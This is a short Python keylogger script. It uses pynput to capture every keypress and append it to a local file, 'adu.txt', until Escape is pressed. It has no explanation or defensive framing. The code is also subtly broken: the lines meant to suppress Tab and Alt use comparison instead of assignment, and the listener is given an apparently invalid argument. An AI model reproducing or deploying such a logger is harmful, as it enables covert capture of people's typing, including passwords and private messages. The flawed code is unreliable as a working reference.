from pynput.keyboard import Listener



def anoymous(key) :
    a = ""
    key=str(key)
    key=key.replace("'","")
    if key == "Key.esc" : 
        raise SystemExit(0) 
    if key == "Key.tab" :
        key == a
    if key == "Key.alt_l" :
        key == a

    with open( "adu.txt" ,"a", encoding='utf-8') as file :
        file.write(key) 
with Listener(on_press=anoymous , encoding = "utf-8") as listener :
    listener.join()

